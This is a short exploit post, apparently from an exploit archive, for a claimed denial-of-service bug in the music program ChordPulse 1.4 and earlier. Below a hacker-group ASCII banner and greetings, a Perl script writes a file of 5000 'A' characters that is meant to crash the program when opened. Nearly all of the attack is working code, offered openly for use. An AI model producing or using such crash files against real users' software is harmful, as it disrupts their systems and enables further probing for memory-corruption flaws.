# Vendor: http://www.chordpulse.com/
########################################################################################
#                                                           _                          #
#                           .-----.--.--.--.----.----.-.---| |                         #
#                           |  _  |  |  |  |     |  -__|  _  |                         #
#                           |   __|________|__|__|_____|_____|                         #
#                           |__|        By MadjiX                                      #
#                                      Sec4ever.com                                    #
########################################################################################
#Title : ChordPulse <--- 1.4 Denial of Service Vulnerability                           #
#author : MadjiX <Dz8[]Hotmail{}com>                                                   #
#Gr33tz : His0k4 , Bibi-info , volc4n0                                                 #
########################################################################################
my $file="madjix.cps";
my $dz="\x41" x 5000 ;
open(MYFILE,'>>MadjiX.cps');
print MYFILE $dz;
close(MYFILE);